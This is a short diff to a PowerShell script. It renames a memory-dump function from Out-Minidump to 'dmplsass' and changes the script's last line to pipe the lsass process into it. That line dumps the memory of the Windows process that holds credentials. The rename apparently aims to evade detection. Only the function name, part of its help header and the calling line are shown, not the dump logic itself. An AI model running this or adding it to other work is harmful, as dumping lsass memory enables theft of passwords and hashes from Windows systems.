@@ -1,4 +1,4 @@
-function Out-Minidump
+function dmplsass
 {
 <#
 .SYNOPSIS
@@ -128,4 +128,4 @@ function Out-Minidump
 
     END {}
 }
-Get-Process lsass | Out-Minidump
+Get-Process lsass | dmplsass
